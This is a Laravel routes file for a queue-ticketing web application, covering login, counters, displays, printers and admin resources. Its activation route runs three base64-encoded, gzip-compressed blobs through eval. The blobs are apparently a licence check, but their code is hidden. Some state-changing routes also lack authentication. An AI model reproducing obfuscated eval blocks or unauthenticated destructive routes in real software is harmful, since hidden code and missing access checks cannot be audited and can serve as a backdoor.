<?php

use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Route;

use App\Http\Controllers\LoginController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\PurposeController;
use App\Http\Controllers\LoketController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\QueueController;
use App\Http\Controllers\OutletController;
use App\Http\Controllers\SettingDisplayController;
use App\Http\Controllers\ActionController;
use App\Http\Controllers\PrinterController;

use App\Models\Action;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return redirect('/login');
});

//Page Panggil Antrian
Route::get('/rincian-loket', [LoketController::class, 'rincian'])->name('dashboard_antrian')->middleware('auth');
Route::post('/panggil-loket', [LoketController::class, 'proses'])->name('panggil_antrian');
Route::get('/tabel-antrian-aktif', [LoketController::class, 'tabelAntrianAktif']);
Route::get('/foto-user-aktif', [LoketController::class, 'fotoUserAktif']);
Route::post('/ambil-detail-antrian', [LoketController::class, 'ambilDetailAntrian']);

//Page Ambil Antrian
Route::get('/antrian', [QueueController::class, 'index'])->name('global_antrian')->middleware('auth');
Route::post('/create-antrian', [QueueController::class, 'antrian'])->name('create-antrian');

//Page Antarmuka Antrian
Route::get('/display-antrian', [QueueController::class, 'display'])->name('display_antrian');
Route::post('/action', [ActionController::class, 'store'])->name('action.store');
Route::get('/action/get', [ActionController::class, 'get'])->name('action.get');
Route::get('/action/destroy', [ActionController::class, 'destroy'])->name('action.destroy');

//Route Login
Route::get('/login', [LoginController::class, 'index'])->name('login')->middleware('guest');
Route::post('/login', [LoginController::class, 'auth'])->name('login_auth')->middleware('guest');
Route::get('/logout', [LoginController::class, 'logout'])->name('logout')->middleware('auth');

//Ubah Password Akun Sendiri
Route::get('/ubah-password', [LoginController::class, 'password'])->middleware('auth');
Route::post('/ubah-password', [LoginController::class, 'ubahPassword'])->name('ubah_password')->middleware('auth');

Route::get('/foto-profile', [LoginController::class, 'foto'])->middleware('auth');
Route::post('/foto-profile', [LoginController::class, 'ubahFoto'])->name('ubah_foto')->middleware('auth');

//Role-Admin
Route::middleware(['admin'])->group(function(){
    Route::resource('/setting/purpose', PurposeController::class);

    Route::resource('/setting/loket', LoketController::class);
    
    Route::resource('/user', UserController::class)->except(['show']);
    Route::get('/user/{user}/password', [UserController::class, 'password']);
    Route::put('/user/{user}/password', [UserController::class, 'password_verification']);
    
    Route::resource('/outlet', OutletController::class)->except(['show']);
    Route::put('/outlet/{outlet}/status', [OutletController::class, 'aktifOutlet']);
    
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard_admin')->middleware('auth');
    Route::post('/dashboard/reset', [DashboardController::class, 'reset'])->name('dashboard.reset')->middleware('auth');

    Route::resource('/setting/display', SettingDisplayController::class)->except(['show']);
    Route::put('/setting/display/{display}/status', [SettingDisplayController::class, 'aktifDisplay']);

    Route::resource('/setting/printer', PrinterController::class);
    Route::post('/setting/printer/{printer}/status', [PrinterController::class, 'status'])->middleware('auth');

    
});
//End Role-Admin

Route::get('/aktivasi', function(){
    eval(gzinflate(base64_decode("DdRFDuxWAgDAu2SVyAszKcrC9ExtxvZmZGa3mU4//w6lKs90+Lt+26ka0r38O0u3kiL+V5T5ryj//kssTGWd7y8nie4ZN317AScBfdkrxkEsLvgoulyvFQX3G4GseDg4GGxTQkG1Er3sLLkPeQ8PbAJiM4Erepj9LFqRSmhHhlij79xgKdlvc15NLRUoUWfYWw3zrSld9nimUX63gk9ggs/v7PeUs8/zSLWedYwTfFz9yRtZIzhxNNA6lVy14NnYvNLdQpubr5FY28/SYGZKnZRfsu3Tm3GnNnrbQhmHxmGF2SG16ipdFB2fD0neOKoCtjDmMw3Z9nARt9uQWThPfccL+1xY14dtO16WN2HKQm/XGWpjVel0f354tIWEDTxfhIUD6JSGIXwMWNAqrrjuCfCX3aXRjvJ8F2ask7FQp/Mk2qSDtySXEE0i/sLiB6MB8SGt6bWCx/C8ssGOGMdXezJ88X1AXQyE5Uy4MvdGGrbMM/gEAjAgdTttTl8EpzbPlzEWeygumWI2OHIrS0DK5XWly35Ya22rnliE5vtacLi//vJEgntJTwVeAALh7YAupXH48d+S2qzrTAJOymmqnb2KefLe/noNN4vkY1ScE2Lo3uxYrI8hBXCr2KzfxBlbwLzO5A7JN4eMa+igTbxGj63D8mdOWO53pMGOd2n96rkISJvaNZCZvNcjQX2PBoGihyYLnq3SsbbOiEoqkoSMIV+6J6Eaa+5lxr7Qfg5NHKnqgRAqVChio8c4Q1G8tQuKrGTwZ+8aEOGZPNbkN6bN4qCngZc8aCc3X2lvIgmv6/DpcFv275S2DX2J8D7MC8SdZ0u+WmWolRxI39BF+1+S8FB7VFr8ktzZ5IOHopcyaHjd5eqRfuRFLCTYm1D15hvS0ntHqnbz1/1sN7PvL+LEGM6/Jk+99Pwdw9TiqwyCGUgjLB9sgxk96tExSPI0KUX7G6oMDDxv7qvwLYhLXsTLXXbfWOtGLQ1Pckpv/vqYHnE7xmZM1R8olGe45YTWiAP3rt8U0i/FNexthIwGWfYBTrG2wbTJjDnwy1cd+eFJxYs3Ar7nKKycMJniVn/tSneKIFoh7gi4W4k7VSgoIwupUJ1Z+HStlaZPhEbTQfKNZuYJ0AEzY3Ebxo3IkPzW1OPMNQ6/M1K2PxT+iEyfMZWJPcGBr1a7AmIDUgHMO4WsItGPNLufmIl25CUm7I6SK8CbbSw91HtbY/CVKDv5LNJWAzl7H66Vl484laD2rjMr3X+GkmRChCqcYan+JGOdQlTYsSz/8osMIczYw8HkW78OeMJa4NG2ZIt9Bmp14uU52h0rabzj9Q+KIVpJVewhDgGFvgZ5AWjWwj6fMg/Kv+MQe3Ncgty5Z15evz6foqwk0/aWdV3Y46HHxJ6wVVfuIsaJktKJnk0bqswMMEXH9fqBTC9lKN2kn1oxu7lJKnO3L0rpEoa4UgYQ0tDg9M0zRX61cl8BtOlYhAMbeKnpmg8yjnss1G1EFpJIdVdxszWdAooLIQs5mstepR5sDgQRiPqQbQIOhhH1yd4+0oizghOpeHgNSuynbI8zyZLmIY8G2oHzWzgkBYsSJ+W2UyQ/OdvE6whKpUqufwF2vJl6SMHjJIx+eH2cgHdLSxg70gU/wLk8BPxLdM9JHciEV224HPbPdph7KHPyqF9UWINuEFTwQFie+inze4jYzdVY5G2BZSE4xmEItifavv77769//vnn3/8D")));
    eval(gzinflate(base64_decode("DZRHrqRYAATv0qvfYgE8vEazgMIX3sNmBIUtvDenn3+CTIUiszjS7qd6mqHs0q34ydK1IPH/8uIz5sXPHz63UWG+Urbi7aN8RrgY2VS7e3XkJcwFydkhOz/v5Ybr3lCqev3AKECooDWpbrif3K00KkLl/oPKEPQpVAtU1leta/NVqaxXEO9Nt4m8GPc0qWlqqQEhNvthbt6uUUVEFa/vMjI8Otq6fquo4FcRd2m2rbRnLLznY6w9ym5AcDKEepsBt8Utl7JRhIQJ7l2iZ9sJSiZHPU01FmTYpDP8S7execpczSjlPcLQDsGX01eVM2gYmLIsXnbgdntAPYaMYZkGD/IaY0xDpflrIA6rSRFUiIVLD+Pi1RVoGXweyMUQ+0kDCCWrzCh7F5voh+Q3yk6qd9BSRY4FjTL47UNMbgGpBkbK7Y1AJk9oiY8Qbuc5AjCthy/XSyyUjud6XFolMqq9mYKet961HBcWZRBtPHwPlmzvaIHzhhJ2MNjyGMeiTQN0vgXjy6Ajn+i++23weBExQ4tMlGodO5A0kgE+XNUZGwO6Vo1rKVQf5TkvySR34mqudTTnaQos/LZl7Vri/pSDPdvVWsNPfdbT44MPkS6eHYIp6NBiSMPv+ikhGUifShSKG3d6z5d65FVWwf7wvn7QtRYGnLXfclHNH4g9J+GV+6bOFLyjgJ3VlNFmhm4anrT0R3wSrhVavuj01jpL3pdJK9OMGM8IG7ih7CEZtUm9OxPJRkNLtEQSG05jJhKlZI94pYPBmk6rBgmhNl1ODOyH+W5WNrjQ9YXsPDry+DRS4Rd6PDnaMSxGtMHr2cU0dx0zcyjma63TIH5EIIVWMrJODHC7M2UhgSpLwMaPuY0PtWBA4VoOjiLaociEjbQSadFbWgAywa2Wu5/NwDJcZUOebdUHAQdnqaVTPdFdpquiLvpKnMzKKb8J6UlSC6CWPKxtKUSzCE+qkb+aq/RSSfFlBiBhX9640OpDbT7Gt588K7fq99RNlRG8qT0vx0AA7/A9jYksLwUO49nV3sDVtEdCjymrDCh90gxxH5qT0LZsvpNoAA/EQbdfG4+5CYMlA73VXnp6zv3BfEQcyNm7vWjfKDa+nDl/RPn7EUveqSgcCYg64Pk3zPjYN7/cPI1YZLqwbQ0WYNYHzyU2p2krQ7S71fgTlG7O4hI57RvhoyF2VmT70msQ86BgFpXe0rjf3qM+E6GG74slhuirLc6J4qGmg597pYTmkPZKFvUg13y0nnRWSBsy92f/GqV3Es7ThMf1pQwH2IvgG2t12Bt4rVG8p1GLs4S6myyPtK9lSsn7EJd6z08kzWcr5laEM+/FKVoQwq+fpJiu5UKSxP3ev+KWG3MTWfg7m8KNGDlLgXnERZtw3J4QMmMpkcirnwFak440F7G2K9LODwu92t3hRq0ikK1ZsgwSylN1IBVd15q1799rkoER65TifBxCo5uXlI77dlbQleps1GZSdcvp9+zjjiz53ra+Lzra4urxVjybT5hX3isYodcqLXQncZP0Yl2DSTBKqZ5wvNGG1b0S6ZuxKU9abae5rtoYw/vNrxpixAgEIZ/qRW6OiCGFkLO5nqi/WLb2uS3rXQHVlEby9gSfCFDbXLKcLemahIU3hJ+zqyn5uulVAJX9R2UdzrOosoQphmFgGObof//8/fv3n/8B")));
    eval(gzinflate(base64_decode("DdNHDqtYAkDRvdTolxjAIz1QqwfkDDYZJi3A5GiSgdX338HVkW55ZsOf+mmnasj28k+ebSVN/u9TFvOn/POPmDqE+L0SrvfRNDMJV+PXSUp826bgRN/1EXdx+epomN9CsAcUaXX0i439TomqvORf0xfnqhd+cjqycCqKFKHlQEiN7ATVgl9Y5CP7qqLHJzssWKmneFy6LQVV7G1a8zMOlxZtvZ3x5iMzpCtxvEA+hcPuNFW0c66o92VMCv9VbiSJujpTiWG2pa494bUK3dUqyjUgd9P50VvCTPoDS19B3NKyQ1fmnrikeavIQ6bslT7sMzzRduIGweaZarh5+9fIRE85foW/75G5jr1w4RZsta/hBDFSi2uX9jJpcr2r4Vnd9MNRu3ljYF4KMzdVJ2cNsjV2pYX3OtdYq85Mtph4Sk6dMqxesAHwG0L1KrNauQCopgmY9WfrEWR0O9tJHW8QpADYxb79azlAwzdpdRgaCczvEEjMipoyMD/SLp3DcAes4B5DLPg3Sezih1NBG2wmOS2KEDoxh9xQCp3ut6yFGdhy0nsaKwUvXfhw692uOg5qXdlQ+xmIs1Uq9gtjI/YJdMw4BHpQtSjjVJs8JnpRfIsCBEEXtnPUs79MP96N1MwT/w2zrTvf0s6cSPYSwW/wc87JjW6pPGTuqWNysBcHDcosEVVJvmsuqvoIzl2c3EFvETbAnPfPiFqUnbKPsFERI8id1wTpQ1O0MqJuilgWxDXEnL1yJj71Bq98TuNsOfMB8hnFfA6o8ah1DJ2zff/KmIUubZZYjeYru2sUUpzpxc+rp221FD+VgNyZDJwI6yyWlDiKZzMvN23kB4CsgyRRt3JArMwhgyigbCw7vKBIzySULRWu9EyYJ/iKmwciBfmmx096bQ+osy9BM/zuK9qyuR7hjq/z+yrHMGaoEipliETnWeTHuYghxQ2gco99b2U/SdP5BmjE+MyWT+2ZR+yEIDAQPda9Cevt3PVmblc8s6eCiFyWnLmdXDAl8bbK5BYTOiCYNIPRuzbRC6XunV3sAGtlKLv1nuodLmkp6u2w5U9hYw2s78jrSIYH6A3HJ0q5s7F5hWSb6HTgfNrocYqtxuniCG+7qGQJHy+2d0tTdENwiAgjsAAN/HPhYzKVby8So+yqw0o6+1tLA4HewiTk2VRl5mvaSsC6lF80uPFxtQQWQpr4xIlSD9KIVlO/J/Vv2rYO35hvkfLRH9ZNVGVtfALRSkj7OkUm4IaVIo1wLDVXpNN6CTpq//BR4Ky1KEbRE3G/Ai29gKF/SD+LXeJk3ZhKb/GIzhLDv5whKVJA9o3wqr8yU4jcbNTbmF55v6yn2IEz/LtCvXHQ4imClUPP8dyJrR9AHsT4dkmNeCVJPWjyAIhIUZWxbPLXUV82TqJnN5pRQlsU5iO3u+FY01JXdDI/RB2YLpqanxfAc2Pa9nlXys1ktGzofdIKpfqqSnmOIj357pWNWB+1pnpYd6MYypcEiTFOgJj8AA6uqBrgtZV3VWSuS5idvew3vSu4L65bwdL+VAbGu0ZMmqYjlfHhNYBx0Z/m8elPEVOR00teaJDOQero/Gk/GzYYz3Opk53b44Wm7UFwv3h43jmkMWq1Re92XLehXwALPVbSgx74h/fOhRbdkvsXCyI982RePROKotWLgCyLoj/mv//8+++///k/")));
    
    $licensi = Action::lisensi();
    $key = Action::generate($licensi);
    if($key===$hasil){
        return redirect('dashboard')->with('success', 'Kode Aktivasi sudah dimasukkan');
    }

    return view('aktivasi.index', [
        'title' => 'Aktivasi Kode',
        'lisensi' => Action::lisensi()
    ]);
});
Route::post('/aktivasi', [LoginController::class, 'aktivasi'])->name('aktivasi');


